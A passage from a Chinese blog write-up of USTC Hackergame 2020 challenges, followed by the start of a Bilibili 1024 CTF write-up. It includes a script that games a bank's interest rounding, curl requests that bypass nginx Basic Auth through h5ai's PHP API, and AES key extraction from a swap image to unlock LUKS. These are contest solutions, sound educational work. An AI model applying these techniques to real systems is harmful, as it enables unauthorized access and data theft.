1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.0/32.png\" width=\"1067\" height=\"247\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/6.png\" width=\"1009\" height=\"593\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/7.png\" width=\"988\" height=\"581\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/13.png\" width=\"782\" height=\"905\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/15.png\" width=\"690\" height=\"94\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>......<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.8/29.png\" width=\"1497\" height=\"412\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完.....吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.7/27.png\" width=\"1150\" height=\"420\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.7/28.png\" width=\"1146\" height=\"539\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏......」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/18.png\" width=\"824\" height=\"864\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>...... 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 ... 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 ... 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/9.png\" width=\"1165\" height=\"294\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/8.png\" width=\"750\" height=\"400\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/10.png\" width=\"1196\" height=\"270\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/11.png\" width=\"687\" height=\"514\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/12.png\" width=\"1371\" height=\"279\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.9/31.png\" width=\"1109\" height=\"135\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\">\n<div>USTC Hackergame 2020（中科大信安赛）write up</div>\n<div><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-11-06</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/1.png\" width=\"1901\" height=\"720\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/2.png\" width=\"830\" height=\"301\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/3.png\" width=\"751\" height=\"666\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/4.png\" width=\"1905\" height=\"853\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/5.png\" width=\"431\" height=\"731\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/6.png\" width=\"1899\" height=\"543\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/7.png\" width=\"1901\" height=\"538\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/8.png\" width=\"646\" height=\"46\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 